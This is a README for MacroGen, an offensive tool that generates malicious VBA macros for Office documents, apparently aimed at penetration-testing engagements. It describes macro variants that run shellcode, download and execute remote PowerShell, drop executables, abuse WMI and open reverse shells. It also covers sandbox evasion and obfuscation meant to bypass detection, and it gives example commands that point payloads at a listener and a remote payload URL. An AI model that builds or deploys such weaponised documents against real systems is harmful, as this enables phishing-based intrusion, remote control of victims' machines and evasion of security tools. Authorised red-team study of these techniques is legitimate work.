# MacroGen

A comprehensive VBA macro generator for Microsoft Office documents, specifically designed for OSEP-level engagements. It simplifies the creation of malicious macros using various techniques to bypass detection and achieve code execution.

## Macro Types (`--type`)
- **vba-classic**: Standard WinAPI shellcode execution via `RtlMoveMemory`, `VirtualAlloc`, and `CreateThread`.
- **vba-ps1**: Downloads and executes a PowerShell command or script from a remote URL.
- **vba-exe**: Drops and executes a malicious executable.
- **vba-wmi**: Uses WMI's `Win32_Process` to achieve code execution.
- **vba-wmi-sf**: Stealthy WMI-based execution with improved de-chaining.
- **vba-msf**: Direct MSFvenom shellcode integration.
- **vba-rev**: A pure VBA-based reverse shell that doesn't rely on external binaries.
- **vba-advanced**: Advanced techniques incorporating sandbox evasion and improved obfuscation.

## Features
- **Payload Framework Integration**: Automatically generates and integrates shellcode for Metasploit, Sliver, and PTY-based shells.
- **Sandbox Evasion**: Optional checks for specific filenames or environment artifacts to prevent execution in analysis environments.
- **Flexible Network Config**: Full control over LHOST, LPORT, and protocols (TCP/HTTP/HTTPS) for generated payloads.
- **PTY Customization**: Allows configuring terminal dimensions (cols/rows) for PTY-based reverse shells.

## Usage

### Parameters
- `--type <TYPE>`: (Required) Specifies the macro execution method (see list above).
- `--payload <PAYLOAD>`: Payload type to generate (`msf`, `pty-win`, `sliver`). Default is `msf`.
- `--msf-payload <NAME>`: MSF payload name (default: `windows/x64/meterpreter/reverse_https`).
- `--lhost <IP>`: Local IP for the shellcode listener.
- `--lport <PORT>`: Local port for the shellcode listener.
- `--bin <PATH>`: Path to a raw shellcode `.bin` file for custom payloads.
- `--remote-url <URL>`: Remote URL for PowerShell-based macros.
- `--filename <NAME>`: Target filename for specific sandbox evasion checks.
- `--proto <PROTO>`: Protocol for Sliver payloads (`tcp`, `http`, `https`).
- `-h, --help`: Show the detailed help message.

### Examples

Generate a classic WinAPI-based macro with an MSF reverse shell:
```bash
python3 MacroGen.py --type vba-classic --payload msf --lhost 10.10.10.10 --lport 443
```

Create a macro that downloads and executes a remote PowerShell script:
```bash
python3 MacroGen.py --type vba-ps1 --remote-url "http://10.10.10.10/payload.ps1"
```

Generate a stealthy WMI-based macro for a custom shellcode binary:
```bash
python3 MacroGen.py --type vba-wmi-sf --bin /path/to/payload.bin --lhost 10.10.10.10 --lport 443
```
